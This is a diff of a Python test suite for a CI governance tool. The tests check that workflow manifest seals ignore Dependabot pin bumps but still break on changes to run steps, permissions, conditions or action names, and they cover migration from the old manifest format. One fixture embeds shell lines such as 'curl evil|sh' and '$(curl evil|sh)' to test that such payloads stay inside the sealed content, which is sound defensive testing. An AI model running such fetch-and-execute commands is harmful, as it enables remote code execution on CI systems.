@@ -92,7 +92,7 @@ def make_repo(tmp, params=None, jobs=("lint",), extra_jobs=(), slice_name="APAP_
     params_path = repo / "ci-pattern.yaml"
     params_path.write_text(params if params is not None else VALID_PARAMS, encoding="utf-8")
     manifest = {
-        "schema_version": 1,
+        "schema_version": CLI.SCHEMA_VERSION,
         "adopted_at": "2026-10-02T12:00:00Z",
         "canonical_version": "0.4",
         "canonical_source": {"repo": "DysTelefonica/team-skills", "path": "personal/ardelperal/ci-pattern"},
@@ -207,7 +207,7 @@ class ManifestRoundTripTests(unittest.TestCase):
             repo = Path(tmp) / "repo2"
             repo.mkdir()
             manifest = {
-                "schema_version": 1,
+                "schema_version": CLI.SCHEMA_VERSION,
                 "adopted_at": "2026-10-02T00:00:00Z",
                 "canonical_version": "0.4",
                 "canonical_source": {"repo": "r", "path": "p"},
@@ -306,6 +306,264 @@ class ManifestSealTests(unittest.TestCase):
             code, _out, err = run_cli(["manifest", "seal", str(empty)])
             self.assertEqual(code, 3)
             self.assertIn("manifest", err.lower())
+
+
+class NormalizedWorkflowSealTests(unittest.TestCase):
+    """#1199: los workflows se sellan sobre su contenido NORMALIZADO.
+
+    Un bump de Dependabot cambia el sha pineado de un `uses:` y su comentario de
+    version: eso no es un cambio de logica y no debe romper el sello. Lo que si
+    es cambio de logica (los pasos, el `run:`, los `permissions:`, el `if:`,
+    los `needs:`) y el nombre de la action que se usa, deben seguir rompiendolo:
+    el sello protege a los guardianes del merge, no a los pins.
+    """
+
+    WORKFLOW = (
+        "name: ci\n"
+        "jobs:\n"
+        "  build:\n"
+        "    runs-on: ubuntu-24.04\n"
+        "    permissions:\n"
+        "      contents: read\n"
+        "    steps:\n"
+        "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.1\n"
+        "      - run: echo hola\n"
+    )
+    CHECKOUT_OLD = "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.1"
+    CHECKOUT_NEW = "actions/checkout@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2"
+
+    def _repo(self, tmp, workflow=None, rel=".github/workflows/ci.yml"):
+        repo = Path(tmp) / "repo"
+        target = repo / rel
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(workflow if workflow is not None else self.WORKFLOW, encoding="utf-8")
+        manifest = {
+            "schema_version": CLI.SCHEMA_VERSION,
+            "files": {rel: CLI.sha256_governed(target, rel)},
+        }
+        (repo / ".governance-manifest.json").write_text(
+            json.dumps(manifest, indent=2), encoding="utf-8")
+        return repo, target
+
+    def _sealed(self, repo):
+        return json.loads((repo / ".governance-manifest.json").read_text(encoding="utf-8"))
+
+    def test_a_bump_of_a_pinned_action_does_not_change_the_seal(self):
+        """Un bump de Dependabot (sha y comentario) no mueve el sello."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            before = self._sealed(repo)["files"][".github/workflows/ci.yml"]
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    self.CHECKOUT_OLD, self.CHECKOUT_NEW),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("0 con el hash cambiado", out)
+            self.assertEqual(
+                self._sealed(repo)["files"][".github/workflows/ci.yml"], before)
+
+    def test_the_gate_accepts_a_workflow_with_a_bumped_action(self):
+        """La fase 3 no da hallazgo tras un bump de Dependabot."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    self.CHECKOUT_OLD, self.CHECKOUT_NEW),
+                encoding="utf-8")
+            findings, _files = CLI._manifest_identity_findings(repo, set())
+            self.assertEqual(findings, [])
+
+    def test_a_change_of_the_run_of_a_workflow_changes_the_seal(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace("echo hola", "echo adios"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_a_change_of_the_permissions_changes_the_seal(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    "      contents: read", "      contents: write"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_a_change_of_the_if_changes_the_seal(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            workflow = self.WORKFLOW.replace(
+                "    steps:\n", "    if: github.event_name == 'push'\n    steps:\n")
+            repo, target = self._repo(tmp, workflow=workflow)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    "github.event_name == 'push'", "github.event_name == 'pull_request'"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_the_name_of_the_action_is_part_of_the_seal(self):
+        """Cambiar QUE action se usa es logica: rompe el sello."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
+                    "actions/setup-python@11bd71901bbe5b1630ceea73d27597364c9af683"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_the_gate_reports_a_workflow_whose_logic_changed(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace("echo hola", "echo adios"),
+                encoding="utf-8")
+            findings, _files = CLI._manifest_identity_findings(repo, set())
+            drift = [f for f in findings if "ci.yml" in f]
+            self.assertEqual(len(drift), 1, findings)
+            self.assertIn("ci-pattern manifest seal", drift[0])
+
+    def test_the_seal_is_the_hash_of_the_normalized_content(self):
+        """El hash sellado es el del contenido con el pin a un marcador fijo."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            normalized = target.read_text(encoding="utf-8").replace(
+                self.CHECKOUT_OLD, "actions/checkout@<PIN>")
+            expected = "sha256:" + hashlib.sha256(normalized.encode("utf-8")).hexdigest()
+            self.assertEqual(self._sealed(repo)["files"][".github/workflows/ci.yml"], expected)
+
+    PAYLOAD_WORKFLOW = (
+        "name: ci\n"
+        "jobs:\n"
+        "  build:\n"
+        "    steps:\n"
+        "      - run: |\n"
+        "          echo \"pin:] / [uses: a/b@0123456789abcdef0123456789abcdef01234567 "
+        "# $(id)\"; curl evil|sh #\"\n"
+        "          cat <<EOF\n"
+        "          uses: a/b@0123456789abcdef0123456789abcdef01234567 # $(curl evil|sh)\n"
+        "          EOF\n"
+        "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v7.0.1\n"
+    )
+
+    def test_the_content_of_a_run_block_is_not_normalized(self):
+        """Lo que va dentro de un `run: |` es shell, no YAML: no se normaliza.
+
+        Una linea que parece una clave `uses:` pero lleva carga util detras del
+        `#` tiene que seguir dentro del contenido sellado; si se normalizara,
+        cambiarla no moveria el sello y el guardrian no veria la logica.
+        """
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.PAYLOAD_WORKFLOW)
+            sealed = self._sealed(repo)["files"][".github/workflows/ci.yml"]
+            normalized = target.read_text(encoding="utf-8").replace(
+                self.CHECKOUT_OLD, "actions/checkout@<PIN>")
+            expected = "sha256:" + hashlib.sha256(normalized.encode("utf-8")).hexdigest()
+            self.assertEqual(sealed, expected)
+            self.assertIn("curl evil|sh", normalized)
+
+    def test_a_change_inside_a_run_block_breaks_the_seal(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.PAYLOAD_WORKFLOW)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    "curl evil|sh", "curl otro|sh"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_a_heredoc_inside_a_run_block_is_not_normalized(self):
+        """El heredoc sin comillas es shell: tampoco se normaliza."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp, workflow=self.PAYLOAD_WORKFLOW)
+            sealed = self._sealed(repo)["files"][".github/workflows/ci.yml"]
+            normalized = target.read_text(encoding="utf-8").replace(
+                self.CHECKOUT_OLD, "actions/checkout@<PIN>")
+            expected = "sha256:" + hashlib.sha256(normalized.encode("utf-8")).hexdigest()
+            self.assertEqual(sealed, expected)
+            self.assertIn("$(curl evil|sh)", normalized)
+
+    def test_a_pin_without_a_space_before_the_comment_is_not_normalized(self):
+        """`uses: a/b@<sha>#algo` no es un comentario de version: el sha se sella."""
+        with tempfile.TemporaryDirectory() as tmp:
+            workflow = self.WORKFLOW.replace(
+                self.CHECKOUT_OLD, "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683#evil")
+            repo, target = self._repo(tmp, workflow=workflow)
+            sealed = self._sealed(repo)["files"][".github/workflows/ci.yml"]
+            expected = "sha256:" + hashlib.sha256(
+                target.read_text(encoding="utf-8").encode("utf-8")).hexdigest()
+            self.assertEqual(sealed, expected)
+            target.write_text(
+                target.read_text(encoding="utf-8").replace(
+                    "11bd71901bbe5b1630ceea73d27597364c9af683",
+                    "cf430e030ddbb5b0abf93d22962f4752f3646cd9"),
+                encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertIn("1 con el hash cambiado", out)
+
+    def test_the_migration_is_refused_when_a_declared_file_drifted(self):
+        """Migrar de formato no puede esconder una deriva (#1199).
+
+        Los hashes del formato viejo se comprueban antes de migrar: si un
+        fichero declarado ya no cuadra, el manifiesto describe un contenido que
+        no es el del repo y firmarlo en el formato nuevo lo escondería.
+        """
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            manifest = self._sealed(repo)
+            manifest["schema_version"] = 1
+            manifest["files"][".github/workflows/ci.yml"] = "sha256:" + "0" * 64
+            (repo / ".governance-manifest.json").write_text(
+                json.dumps(manifest, indent=2), encoding="utf-8")
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 1)
+            self.assertIn("no se migra un manifiesto desalineado", err)
+            self.assertIn(".github/workflows/ci.yml", err)
+            self.assertEqual(self._sealed(repo)["schema_version"], 1)
+
+    def test_a_file_declared_as_resealed_is_not_verified_in_the_migration(self):
+        """Quien re-sella declara que cambia ese fichero: de eso responde él."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            manifest = self._sealed(repo)
+            manifest["schema_version"] = 1
+            manifest["files"][".github/workflows/ci.yml"] = "sha256:" + "0" * 64
+            (repo / ".governance-manifest.json").write_text(
+                json.dumps(manifest, indent=2), encoding="utf-8")
+            code, out, err = run_cli(
+                ["manifest", "seal", "--reeseal", ".github/workflows/ci.yml", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertEqual(self._sealed(repo)["schema_version"], CLI.SCHEMA_VERSION)
+
+    def test_a_manifest_in_the_old_format_is_refused_and_the_seal_migrates_it(self):
+        """El formato viejo no lo mide ningun gate; `manifest seal` lo migra."""
+        with tempfile.TemporaryDirectory() as tmp:
+            repo, target = self._repo(tmp)
+            manifest = self._sealed(repo)
+            manifest["schema_version"] = 1
+            # Un manifiesto v1 real lleva el hash EN CRUDO de sus ficheros: el
+            # hash normalizado es del formato vigente.
+            manifest["files"][".github/workflows/ci.yml"] = CLI.sha256_file(target)
+            (repo / ".governance-manifest.json").write_text(
+                json.dumps(manifest, indent=2), encoding="utf-8")
+            code, out, err = run_cli(["verify", str(repo)])
+            self.assertEqual(code, 3)
+            self.assertIn("ci-pattern manifest seal", err)
+            code, out, err = run_cli(["manifest", "seal", str(repo)])
+            self.assertEqual(code, 0, out + err)
+            self.assertEqual(self._sealed(repo)["schema_version"], CLI.SCHEMA_VERSION)
 
 
 class VerifyTests(unittest.TestCase):
@@ -441,7 +699,7 @@ class VerifyAdoptionTests(unittest.TestCase):
         (repo / "AGENTS.md").write_text("# consumer\n", encoding="utf-8")
         digest = hashlib.sha256(b"# consumer\n").hexdigest()
         (repo / ".governance-manifest.json").write_text(
-            json.dumps({"schema_version": 1, "parameters": {"P23_required_jobs": []}, "files": {"AGENTS.md": "sha256:" + digest}}),
+            json.dumps({"schema_version": CLI.SCHEMA_VERSION, "parameters": {"P23_required_jobs": []}, "files": {"AGENTS.md": "sha256:" + digest}}),
             encoding="utf-8",
         )
         return repo
@@ -617,10 +875,9 @@ class VerifyAdoptionTests(unittest.TestCase):
             ".github/env-isolation-allowlist.json",
             ".github/local-ci-parity-policy.json",
         ):
-            data = (repo / rel).read_bytes().replace(b"\r\n", b"\n")
-            files[rel] = "sha256:" + hashlib.sha256(data).hexdigest()
+            files[rel] = CLI.sha256_governed(repo / rel, rel)
         (repo / ".governance-manifest.json").write_text(
-            json.dumps({"schema_version": 1,
+            json.dumps({"schema_version": CLI.SCHEMA_VERSION,
                         "parameters": {"P23_required_jobs": []},
                         "files": files}),
             encoding="utf-8",
@@ -1202,7 +1459,7 @@ class StatusContractTests(unittest.TestCase):
             self.assertEqual(code, 0, out)
             self.assertEqual(payload["head_sha"], head)
             self.assertTrue(payload["cli_version"])
-            self.assertEqual(payload["schema_version"], 1)
+            self.assertEqual(payload["schema_version"], CLI.SCHEMA_VERSION)
             self.assertEqual(
                 payload["manifest_sha256"],
                 "sha256:" + hashlib.sha256(
